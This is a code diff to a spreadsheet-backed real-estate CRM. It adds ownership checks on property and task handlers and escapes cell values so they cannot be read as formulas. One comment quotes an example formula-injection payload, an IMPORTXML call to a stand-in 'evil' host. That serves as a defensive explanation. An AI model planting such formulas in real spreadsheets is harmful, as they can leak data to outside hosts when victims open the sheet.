@@ -351,17 +351,38 @@ var HANDLERS = {
     return { success: true, remarks: remarks };
   },
 
+  // Properties aren't covered by any role whitelist (CRM/Viewer are already
+  // blocked from these three methods entirely), so an Agent previously had
+  // no server-side limit at all — they could edit or delete ANY property via
+  // a direct API call, not just ones assigned to them. canManageProperty()
+  // closes that the same way canManageLead() does for leads.
   addProperty: function (prop) {
+    prop = prop || {};
+    if (CURRENT_CALLER && CURRENT_CALLER.Role !== 'Admin') {
+      prop.AssignedTo = [CURRENT_CALLER.Name]; // Agents can only assign a new property to themselves
+    }
     appendRow('Properties', prop);
     return { success: true, id: prop.PropertyID };
   },
 
   updateProperty: function (prop) {
-    updateRow('Properties', 'PropertyID', prop.PropertyID, prop);
+    var current = findRow('Properties', 'PropertyID', prop.PropertyID);
+    if (!current) return { error: 'Property not found: ' + prop.PropertyID };
+    if (!canManageProperty(current)) return { error: 'You can only manage properties assigned to you' };
+
+    var patch = {};
+    for (var k in prop) { if (prop.hasOwnProperty(k)) patch[k] = prop[k]; }
+    if (CURRENT_CALLER.Role !== 'Admin') {
+      patch.AssignedTo = current.AssignedTo; // only Admin may change who a property is assigned to
+    }
+    updateRow('Properties', 'PropertyID', prop.PropertyID, patch);
     return { success: true };
   },
 
   deleteProperty: function (propId) {
+    var current = findRow('Properties', 'PropertyID', propId);
+    if (!current) return { error: 'Property not found: ' + propId };
+    if (!canManageProperty(current)) return { error: 'You can only manage properties assigned to you' };
     deleteRow('Properties', 'PropertyID', propId);
     return { success: true };
   },
@@ -458,11 +479,20 @@ var HANDLERS = {
   },
 
   addTask: function (task) {
+    task = task || {};
+    if (CURRENT_CALLER && CURRENT_CALLER.Role !== 'Admin') {
+      task.Agent = CURRENT_CALLER.Name; // a task always belongs to whoever created it, unless Admin
+    }
     appendRow('Tasks', task);
     return { success: true, id: task.TaskID };
   },
 
   updateTask: function (taskId, patch) {
+    var current = findRow('Tasks', 'TaskID', taskId);
+    if (!current) return { error: 'Task not found: ' + taskId };
+    if (CURRENT_CALLER && CURRENT_CALLER.Role !== 'Admin' && !sameNameServer(current.Agent, CURRENT_CALLER.Name)) {
+      return { error: 'You can only manage your own tasks' };
+    }
     updateRow('Tasks', 'TaskID', taskId, patch);
     return { success: true };
   }
@@ -632,6 +662,16 @@ function canManageLead(lead) {
   return sameNameServer(lead.Agent, CURRENT_CALLER.Name);
 }
 
+// Admin manages every property. An Agent may only manage properties
+// currently assigned to them (CRM/Viewer never reach here — they're
+// blocked from every property-mutating method by their whitelists).
+function canManageProperty(prop) {
+  if (!CURRENT_CALLER) return false;
+  if (CURRENT_CALLER.Role === 'Admin') return true;
+  var assigned = parseJsonArray(prop.AssignedTo);
+  return assigned.some(function (n) { return sameNameServer(n, CURRENT_CALLER.Name); });
+}
+
 // Opaque random session token, issued at login/signup, stored on the user's
 // row. One active session per user: a new login replaces the old token.
 function newToken() {
@@ -667,9 +707,22 @@ function hashPassword(password, salt) {
 }
 
 // Objects/arrays are stored as JSON text so a single cell can hold them.
+//
+// SECURITY: Google Sheets treats a cell value beginning with =, +, -, or @
+// as a FORMULA, not literal text — including values written via the API,
+// not just typed by hand. Every write (leads, properties, tasks, remarks,
+// history, imported rows) ultimately passes through here, so this is the
+// one place that has to neutralize that: prefixing with a leading
+// apostrophe is Sheets' own "force literal text" convention and stops a
+// value like =IMPORTXML("https://evil/","//a") — submitted through any
+// free-text field by any authenticated user, or via Excel import — from
+// becoming a live, executing formula the moment an Admin opens the sheet.
 function serializeCell(value) {
   if (value === null || value === undefined) return '';
   if (typeof value === 'object') return JSON.stringify(value);
+  // Only strings can be mistaken for formulas — a real number (e.g. a
+  // negative longitude like -74.006) must stay a number, not become text.
+  if (typeof value === 'string' && /^[=+\-@]/.test(value)) return "'" + value;
   return value;
 }
 
